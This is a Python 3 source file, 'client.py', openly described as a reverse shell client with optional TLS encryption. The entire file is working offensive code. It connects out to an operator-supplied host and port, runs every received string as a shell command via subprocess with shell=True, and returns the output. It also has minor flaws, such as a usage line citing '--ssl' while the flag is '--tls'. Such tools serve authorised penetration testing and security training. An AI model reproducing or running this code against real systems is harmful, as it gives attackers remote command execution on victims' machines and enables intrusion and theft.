#!/usr/bin/env python3

"""
Author       - pyCity
Date         - 1/22/2019
Version      - 2.0

Usage:       - python client.py --ssl 127.0.0.1 4444

Description: - Reverse shell in python 3. Has TLS functionality using
             - a DHE-RSA-AES256-SHA256 cipher.
"""

import socket
import subprocess
import os
import time
import argparse
import ssl
import sys


def parse_args():
    """Define host and port variables with optional ssl"""

    parser = argparse.ArgumentParser(description="Python remote tcp client")
    parser.add_argument("host", help="Remote host name to connect to")
    parser.add_argument("port", help="Remote port to connect to", type=int)
    parser.add_argument("--tls", help="Enable TLS encryption", action="store_true")

    # Array of parsed arguments (host, port, encryption)
    args = parser.parse_args()
    host, port, enc = args.host, args.port, args.tls
    return host, port, enc



def connect(host, port, enc=False):
    """Create socket object, connect socket to server"""

    s = socket.socket()
    socket.setdefaulttimeout(10)

    # Wait 10 secs if connection isn't successful immediately
    for i in range(10):
        try:
            if enc == True:
                context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
                context.set_ciphers('DHE-RSA-AES256-SHA256')
                context.load_dh_params("dhparam.pem")
                context.load_cert_chain(certfile="server.crt", keyfile="server.key")
                s = context.wrap_socket(s, do_handshake_on_connect=True)
            s.connect((host, port))
            return s

        except:
            time.sleep(5)



def serve_shell(s):
    """Receive commands from remote server and run on local machine"""

    # Standard reverse shell
    while True:
        data = s.recv(1024).decode("utf-8")
        if data[:2] == 'cd':
            os.chdir(data[3:].strip())
        elif data[:4].strip() == "kill":
            break
        if len(data) > 0:
            cmd = subprocess.Popen(data[:], shell=True,
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)

            bytes_recieved = cmd.stdout.read() + cmd.stderr.read()
            output = str(bytes_recieved, "utf-8")
            s.send(str.encode(output + str(os.getcwd()) + '#> '))
    s.close()
    sys.exit()



if __name__ == "__main__":
    host, port, enc = parse_args()
    serve_shell(connect(host, port, enc))
